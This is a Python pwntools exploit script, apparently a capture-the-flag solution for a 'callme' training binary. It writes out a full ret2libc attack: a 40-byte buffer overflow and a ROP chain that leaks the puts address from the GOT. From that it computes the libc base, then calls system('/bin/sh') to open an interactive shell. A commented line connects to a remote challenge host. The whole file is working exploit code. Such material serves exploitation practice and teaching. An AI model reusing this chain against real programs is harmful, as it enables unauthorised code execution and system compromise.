from encodings import utf_8
from pwn import *
from pprint import pprint
import warnings

warnings.filterwarnings("ignore")
# context.binary = elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')

offset = 40

elf = context.binary = ("./libc6_2.31-0ubuntu9_amd64.so")
elf = ELF("./callme")
libc = elf.libc

rop = ROP([elf,libc])

p = elf.process()

# pprint(elf.symbols)

p.recvuntil("Hope you read the instructions...")
p.recvline()

deadbeef = int(hex(0xdeadbeefdeadbeef),0)
cafebabe = int(hex(0xcafebabecafebabe),0)
d00df00d = int(hex(0xd00df00dd00df00d),0)

rop.call("puts",[elf.got["puts"]])
rop.call("main")

# rop.call("callme_one",[deadbeef,cafebabe,d00df00d])
# rop.call("callme_two",[deadbeef,cafebabe,d00df00d])
# rop.call("callme_three",[deadbeef,cafebabe,d00df00d])

payload = [
    
    b"A" * offset, 
    rop.chain()
    
]

payload = b"".join(payload)

p.send(payload)

# print(rop.dump())

p.recvline()
p.recvline()
puts_addr = (u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00")))

libc.address = puts_addr - libc.symbols["puts"]

p.recvuntil("Hope you read the instructions...")
p.recvline()

log.info(f"Indirizzo della puts : {hex(puts_addr)}")
log.info(f"Indirizzo start libc : {hex(libc.address)}")

rop = ROP([elf,libc])

binsh = next(libc.search(b"/bin/sh\x00"))

rop.call("puts",[elf.got["puts"]])
rop.call("system",[binsh])

payload = [
    
    b"A" * offset, 
    rop.chain()
    
]

payload = b"".join(payload)

p.send(payload)

p.recvline()
p.recvline()

p.interactive()

# log.info(f"This is the super secret strig : {p.recvline().decode('utf-8')}")
# log.info(f"This is the flag : {p.recvline().decode('utf-8')}")

# print(p.recvline())
# print(p.recvline())

# libc = elf.libc

# p = connect('spclr.ch', 1337)
